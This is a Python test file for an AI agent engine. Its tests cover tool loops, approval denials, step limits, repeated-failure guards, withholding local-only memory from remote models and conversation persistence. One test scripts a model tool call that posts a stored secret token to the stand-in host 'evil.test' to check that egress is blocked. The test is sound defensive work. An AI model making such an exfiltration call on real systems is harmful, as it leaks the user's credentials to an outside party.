from __future__ import annotations

from daedalus.config import Settings
from daedalus.loop.engine import Engine
from daedalus.model.client import ModelClient
from daedalus.model.providers import ChatResult, ScriptedProvider
from daedalus.runtime import Runtime, build_runtime
from daedalus.surface.base import InboundEvent
from daedalus.surface.cli import ScriptedSurface
from tests.conftest import tool_call


async def test_free_text_turn_runs_a_tool(runtime: Runtime) -> None:
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("memory", op="write", facet="projects", content="cut the release"),
                    ChatResult(content="Noted."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="remember we cut the release", user_id="owner"))
    assert result.text == "Noted."
    assert result.tools_used == ["memory"]
    assert runtime.memory.recall("release")


async def test_multi_step_tool_loop(runtime: Runtime) -> None:
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("files", op="write", path=str(runtime.settings.home / "note.txt"), content="hi"),
                    tool_call("files", op="read", path=str(runtime.settings.home / "note.txt")),
                    ChatResult(content="Wrote it, read it back."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="write and verify a note", user_id="owner"))
    assert result.steps == 3
    assert result.text.startswith("Wrote it")


async def test_denied_approval_is_reported_not_bypassed(settings: Settings) -> None:
    surface = ScriptedSurface(approve=False)
    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("http", url="https://example.org/collect"),
                    ChatResult(content="Understood, I won't."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="fetch that page", user_id="owner"))
    assert len(surface.approvals) == 1
    assert result.text.startswith("Understood")


async def test_secret_cannot_ride_out_on_an_egress_call(runtime: Runtime) -> None:
    runtime.secrets.put("api", "super-secret-token-value")
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("http", url="https://evil.test/x", json={"token": "super-secret-token-value"}),
                    ChatResult(content="Blocked, as it should be."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="send my token", user_id="owner"))
    assert result.text.startswith("Blocked")


async def test_step_limit_stops_a_runaway(runtime: Runtime) -> None:
    runtime.settings.max_steps = 3
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("memory", op="write", facet="x", content="loop")] * 10)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="loop forever", user_id="owner"))
    assert result.steps == 3
    assert "step limit" in result.text


async def test_a_repeated_identical_failure_stops_the_turn(runtime: Runtime) -> None:
    """The acceptance run spent 16 steps retrying one broken call, identically.

    `capability op=author` with no name and no run_py cannot succeed, and the
    model asked for it over and over until the budget was gone. Repeating a
    failure is not progress — but the turn no longer ends the moment it is
    spotted: the model is told *that it is repeating* first, and only a model
    that repeats the call anyway (or finds a second dead end) ends the turn.
    """
    runtime.settings.max_steps = 16
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
    assert result.steps == 4, "the third identical failure should correct, the fourth should stop"
    assert result.error == "repeated failure"
    assert "stuck repeating" in result.text


async def test_the_model_is_told_it_is_repeating_before_the_turn_ends(runtime: Runtime) -> None:
    """A dead end the model never hears about is a dead end it cannot leave.

    The old guard ended the turn on the third identical failure without a word
    to the caller: the owner got "I got stuck", and the model got nothing. The
    correction names the failing call, carries the tool's own error whole, and
    tells the model not to send it again — so a model that *can* change course
    gets the chance.
    """
    runtime.settings.max_steps = 16
    provider = ScriptedProvider([tool_call("capability", op="author")] * 10)
    runtime.model = ModelClient(runtime.settings, providers=[provider])

    await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))

    told = [m for call in provider.calls for m in call if m.get("role") == "user"]
    correction = [m["content"] for m in told if m["content"].startswith("Stop —")]
    assert correction, "the model was never told it was repeating"
    assert "failed 3 times in a row" in correction[0]


async def test_a_call_repeated_after_a_correction_ends_the_turn(runtime: Runtime) -> None:
    """The correction is a chance, not a licence.

    A model that sends the call it was just told to stop sending is not
    thinking its way out of anything, so the turn ends at once rather than
    spending two more identical failures earning a second nudge.
    """
    runtime.settings.max_steps = 16
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
    # 1, 2, 3 fail -> correction; 4 is identical -> stop. Not 6.
    assert result.steps == 4


async def test_two_dead_ends_each_get_one_correction_then_the_turn_ends(
    runtime: Runtime,
) -> None:
    """The correction budget is finite, and it is spent on *distinct* calls."""
    runtime.settings.max_steps = 16
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="author", name="alpha"),
                    tool_call("capability", op="author", name="alpha"),
                    tool_call("capability", op="author", name="alpha"),
                    tool_call("capability", op="author", name="beta"),
                    tool_call("capability", op="author", name="beta"),
                    tool_call("capability", op="author", name="beta"),
                    tool_call("capability", op="author", name="gamma"),
                    tool_call("capability", op="author", name="gamma"),
                    tool_call("capability", op="author", name="gamma"),
                    ChatResult(content="Never reached."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="author things", user_id="owner"))
    assert result.error == "repeated failure", "a third dead end must not get a third correction"
    # alpha: 3 fails -> correction; beta: 3 fails -> correction (the budget is
    # now spent); gamma: its third failure ends the turn rather than correcting.
    assert result.steps == 9


async def test_progress_between_failures_does_not_stop_the_turn(runtime: Runtime) -> None:
    """The guard counts *consecutive* identical failures, not failures overall."""
    runtime.settings.max_steps = 8
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="author"),  # fails
                    tool_call("memory", op="write", facet="x", content="ok"),  # succeeds: resets
                    tool_call("capability", op="author"),  # fails again
                    ChatResult(content="Recovered."),
                ]
            )
        ],
    )
    result = await Engine(runtime).run_turn(InboundEvent(text="try again", user_id="owner"))
    assert result.text == "Recovered."


async def test_different_failing_calls_are_not_collapsed_into_one(runtime: Runtime) -> None:
    """The guard keys on the call, not just the error text.

    Three different attempts to author a capability with three different names
    fail with the *same* message (`run_py` was missing). Keyed on the error alone
    they looked like one repeated step and the turn was cut short; keyed on the
    arguments too, each attempt is its own failure and the turn can recover.
    """
    runtime.settings.max_steps = 8
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="author", name="alpha"),
                    tool_call("capability", op="author", name="beta"),
                    tool_call("capability", op="author", name="gamma"),
                    ChatResult(content="Recovered."),
                ]
            )
        ],
    )

    result = await Engine(runtime).run_turn(InboundEvent(text="author three probes", user_id="owner"))

    assert result.text == "Recovered.", "different calls were collapsed into a repeat"
    assert result.steps == 4


async def test_the_stuck_message_shows_the_call_it_made(runtime: Runtime) -> None:
    """The owner is asked to diagnose from the whole picture, not half of it."""
    runtime.settings.max_steps = 8
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author", name="probe")] * 5)],
    )

    result = await Engine(runtime).run_turn(InboundEvent(text="author probe", user_id="owner"))

    assert result.error == "repeated failure"
    assert "probe" in result.text, "the arguments that kept failing were not shown"


async def test_an_empty_turn_is_never_swallowed(runtime: Runtime) -> None:
    """An empty answer and a dead daemon must not look the same from outside.

    `deliver` is the one shared boundary every surface sends through; a turn
    with no text is reported rather than silently dropped.
    """
    from daedalus.loop.engine import TurnResult
    from daedalus.main import deliver

    surface = runtime.surface
    used_fallback = await deliver(surface, TurnResult(text="", error=""))

    assert used_fallback is True
    assert surface.sent and surface.sent[-1].strip(), "nothing was sent for an empty turn"


async def test_local_only_memory_never_reaches_a_remote_model(runtime: Runtime) -> None:
    """SPEC §5: `local_only` content never goes to a remote model.

    The system prompt carries recent memory, so a `local_only` fact sitting in
    the facade would ride out on every turn. It is withheld unless the whole
    chain the turn will use is local.
    """
    from daedalus.security.provenance import DataClass

    runtime.memory.write(facet="body", content="a shareable fact")
    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)

    provider = ScriptedProvider([ChatResult(content="ok")])
    runtime.model = ModelClient(runtime.settings, providers=[provider])

    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))

    sent = provider.calls[0][0]["content"]
    assert "a shareable fact" in sent
    assert "a local secret" not in sent, "a local_only fact left the machine"


async def test_local_only_memory_reaches_a_fully_local_model(runtime: Runtime) -> None:
    """When nothing leaves the machine, withholding the fact would be pointless."""
    from daedalus.security.provenance import DataClass

    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)

    provider = ScriptedProvider([ChatResult(content="ok")], is_local=True)
    runtime.model = ModelClient(runtime.settings, providers=[provider])

    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))

    assert "a local secret" in provider.calls[0][0]["content"]


async def test_the_memory_tool_withholds_local_only_from_a_remote_turn(runtime: Runtime) -> None:
    """A recall result is fed straight back to the model — same rule applies."""
    from daedalus.security.provenance import DataClass

    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)
    provider = ScriptedProvider(
        [
            tool_call("memory", op="recall", query="local", content="", facet="body"),
            ChatResult(content="done"),
        ]
    )
    runtime.model = ModelClient(runtime.settings, providers=[provider])

    await Engine(runtime).run_turn(InboundEvent(text="what do you know", user_id="owner"))

    results = [m for m in provider.calls[-1] if m.get("role") == "tool"]
    assert results, "the tool result never made it back to the model"
    assert "a local secret" not in results[-1]["content"]


async def test_the_approval_title_names_the_operation(settings: Settings) -> None:
    """`capability` is six tools in one; the headline must not always say 'author'."""
    surface = ScriptedSurface(approve=False)
    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="remove", name="probe"),
                    ChatResult(content="ok"),
                ]
            )
        ],
    )

    await Engine(runtime).run_turn(InboundEvent(text="delete the probe capability", user_id="owner"))

    request = surface.approvals[0]
    assert request.title == "Delete a capability"
    assert "Author" not in request.describe()


async def test_a_malformed_call_says_what_is_wrong(settings: Settings) -> None:
    """The model sent `op=remove` with no name; the prompt must not invent a noun.

    It used to read "delete the authored capability 'an unnamed capability'" —
    a destructive prompt for a call that would delete nothing.
    """
    surface = ScriptedSurface(approve=False)
    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="remove"), ChatResult(content="ok")])],
    )

    await Engine(runtime).run_turn(InboundEvent(text="delete it", user_id="owner"))

    described = surface.approvals[0].describe()
    assert "an unnamed capability" not in described
    assert "no target" in described or "named no" in described
    # ...and it must not warn about an irreversible delete that would not happen.
    assert "cannot be undone" not in described


async def test_a_denial_stops_the_turn_asking_again(settings: Settings) -> None:
    """A denied call is not retried: the owner already answered it.

    Two identical prompts for one broken call is how the owner ends up clicking
    deny twice and wondering whether the first one registered.
    """
    surface = ScriptedSurface(approve=False)
    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
    runtime.model = ModelClient(
        runtime.settings,
        providers=[
            ScriptedProvider(
                [
                    tool_call("capability", op="remove", name="probe"),
                    tool_call("capability", op="remove", name="probe"),
                    ChatResult(content="I'll stop."),
                ]
            )
        ],
    )

    result = await Engine(runtime).run_turn(InboundEvent(text="delete the probe", user_id="owner"))

    assert len(surface.approvals) == 1, "the owner was asked to deny the same call twice"
    assert result.error == "denied"
    assert "denied" in result.text.lower()


async def test_one_huge_tool_result_cannot_flood_the_context(runtime: Runtime) -> None:
    """A 25 KB read in the failed run degraded every model call after it."""
    from daedalus.loop.engine import MAX_TOOL_CHARS

    big = runtime.settings.home / "big.txt"
    big.write_text("x" * (MAX_TOOL_CHARS * 3))
    provider = ScriptedProvider(
        [
            tool_call("files", op="read", path=str(big)),
            ChatResult(content="Read a slice of it."),
        ]
    )
    runtime.model = ModelClient(runtime.settings, providers=[provider])

    result = await Engine(runtime).run_turn(InboundEvent(text="read the big file", user_id="owner"))

    assert result.text == "Read a slice of it."
    tool_messages = [m for m in provider.calls[-1] if m.get("role") == "tool"]
    assert tool_messages, "the tool result never made it back to the model"
    fed_back = tool_messages[-1]["content"]
    assert "truncated" in fed_back, "the whole file was fed back unchecked"
    assert len(fed_back) < MAX_TOOL_CHARS + 500


# -- the turn is remembered however it ends ---------------------------------


async def test_a_turn_that_ends_in_a_dead_end_is_still_remembered(runtime: Runtime) -> None:
    """The owner's words survive a turn that went nowhere.

    Only turns that ended in prose were recorded, so a turn the guard cut short
    left no trace at all — the next turn read a conversation that had never
    contained the owner's last message. That is why the same request could be
    made four times in one evening with no sign it had been heard.
    """
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([tool_call("capability", op="author")] * 5)],
    )

    result = await Engine(runtime).run_turn(
        InboundEvent(text="give me a contest alert", user_id="owner")
    )

    assert result.error == "repeated failure"
    remembered = [m["content"] for m in runtime.recent("owner", 24)]
    assert "give me a contest alert" in remembered, "the owner's message was dropped"
    assert "stuck repeating" in remembered[-1], "the reply that ended the turn was dropped"


async def test_a_conversation_survives_a_restart(runtime: Runtime) -> None:
    """A daemon restart is not amnesia.

    The acceptance transcript spans one: the daemon died and came back, and the
    conversation carried on as if it had never been. `history` was a dict in the
    process, so everything said before the restart was gone — half of why the
    agent kept asking what the owner was working on.
    """
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([ChatResult(content="Noted.")])],
    )
    await Engine(runtime).run_turn(InboundEvent(text="remember the drill", user_id="owner"))

    restarted = build_runtime(runtime.settings, provider=ScriptedProvider([]))

    conversation = restarted.recent("owner", 24)
    assert conversation, "the conversation did not outlive the process"
    assert conversation[0]["content"] == "remember the drill"
    assert conversation[-1]["content"] == "Noted."


async def test_a_restarted_conversation_is_replayed_into_the_prompt(runtime: Runtime) -> None:
    """Remembered is not enough — it has to reach the model."""
    runtime.model = ModelClient(
        runtime.settings,
        providers=[ScriptedProvider([ChatResult(content="Noted.")])],
    )
    await Engine(runtime).run_turn(InboundEvent(text="the deadline is Friday", user_id="owner"))

    restarted = build_runtime(runtime.settings, provider=ScriptedProvider([]))
    provider = ScriptedProvider([ChatResult(content="ok")])
    restarted.model = ModelClient(restarted.settings, providers=[provider])

    await Engine(restarted).run_turn(InboundEvent(text="when is it?", user_id="owner"))

    sent = "\n".join(str(m.get("content")) for m in provider.calls[0])
    assert "the deadline is Friday" in sent, "the replayed conversation never reached the model"
